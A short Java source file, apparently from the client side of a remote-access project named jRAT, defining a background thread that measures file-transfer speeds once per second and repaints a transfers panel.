package se.jrat.client.threads;

import java.util.List;

import se.jrat.client.ui.panels.PanelFileTransfers;
import se.jrat.common.io.TransferData;

public class ThreadTransferSpeed extends Thread {

	public ThreadTransferSpeed() {
		super("Transfer speed thread");
	}

	public void run() {
		while (true) {
			List<TransferData> transfers = PanelFileTransfers.instance.getTransfers();
			
			for (TransferData transfer : transfers) {
				transfer.setLastRead(transfer.getRead());
			}
			
			try {
				Thread.sleep(1000L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
			
			for (TransferData transfer : transfers) {
				transfer.setSpeed(transfer.getDiff());
				PanelFileTransfers.instance.repaint();
			}
		}
	}

}
